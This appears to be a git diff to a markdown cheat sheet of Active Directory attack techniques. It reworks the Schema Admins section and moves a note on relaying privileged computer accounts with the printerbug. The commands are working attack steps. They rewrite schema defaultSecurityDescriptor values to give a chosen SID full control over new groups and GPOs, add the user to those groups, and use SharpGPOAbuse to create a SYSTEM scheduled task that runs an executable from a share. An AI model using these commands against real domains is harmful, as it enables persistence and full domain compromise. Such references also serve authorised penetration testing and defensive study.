@@ -12,6 +12,7 @@
   * [Backup Operators](#Backup-Operators)
   * [Account Operators](#Account-Operators)
   * [DNS Admins](#DNS-Admins)
+  * [Schema Admins](#Schema-Admins)
   * [Computers with high privileges](#Computers-with-high-privileges)
 * [Access Control List(ACL)](#Access-Control-List)
   * [Check specific ACL permissions](#Specific-ACL-permissions)
@@ -398,35 +399,30 @@ sc \\<dns server> stop dns
 sc \\<dns server> start dns
 ```
 
-### Computers with high privileges
-- Computerobjects part of a high privileged group have the same permissions as users part of the group.
-- Might be able to Relay the privileges of the computeraccount in combination with the printerbug!
-
-#### Enumerate computers part of high privileged groups
-```
-Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse -ErrorAction Silentlycontinue -WarningAction Silentlycontinue | Where-Object -Property MemberObjectClass -Match computer | Select-Object MemberName
-```
-
 ### Schema Admins
+- Use the ADModule not Powerview!
+
 #### Get User SID
 - This user will have privileges for new objects
 ```
-Get-DomainUser <USER> | Select-Object samaccountname, objectsid
+Get-ADUser <USER> -Properties * | Select-Object Samaccountname, Objectsid
 ```
 
-#### Modify schema - group
+### Modify schema - group
 - Using the `SID` of previous command
 - This will give us full control over the groups that are created **after** the modification.
+- Use the ADModule not Powerview!
 ```
 Set-ADObject -Identity "CN=group,CN=Schema,CN=Configuration,DC=<DOMAIN>,DC=local" -Replace @{defaultSecurityDescriptor = 'D:(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;DA)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;SY)(A;;RPLCLORC;;;AU)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;<SID>)';} -Verbose
 ```
 
 #### Check new groups
 ```
-Get-DomainGroup | Select-Object samaccountname, whencreated
+Get-ADGroup -Properties * | Select-Object samaccountname, whencreated | Sort-Object whencreated
 ```
 
 #### Check if user has ACL of new group
+- With PowerView
 ```
 Get-DomainGroup <GROUP> | Get-DomainObjectAcl | ? {$_.SecurityIdentifier -eq "<SID USER>"}
 ```
@@ -436,7 +432,7 @@ Get-DomainGroup <GROUP> | Get-DomainObjectAcl | ? {$_.SecurityIdentifier -eq "<S
 Add-ADGroupMember <GROUP> -Members <USER>
 ```
 
-#### Modify schema - GPO
+### Modify schema - GPO
 ```
 Set-ADObject -Identity "CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=<DOMAIN>,DC=local" -Replace @{defaultSecurityDescriptor = 'D:(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;DA)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;SY)(A;;RPLCLORC;;;AU)(A;;RPWPCRCCDCLCLORCWOWDSDDTSW;;;<SID>)';} -Verbose
 ```
@@ -455,6 +451,14 @@ net localgroup administrators
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c <SHARE>\<EXECUTABLE FILE>" --GPOName "<GPO>"
 ```
 
+### Computers with high privileges
+- Computerobjects part of a high privileged group have the same permissions as users part of the group.
+- Might be able to Relay the privileges of the computeraccount in combination with the printerbug!
+
+#### Enumerate computers part of high privileged groups
+```
+Get-DomainGroup -AdminCount | Get-DomainGroupMember -Recurse -ErrorAction Silentlycontinue -WarningAction Silentlycontinue | Where-Object -Property MemberObjectClass -Match computer | Select-Object MemberName
+```
 
 ## Access Control List
 - It is possible to abuse permissions (ACL's)
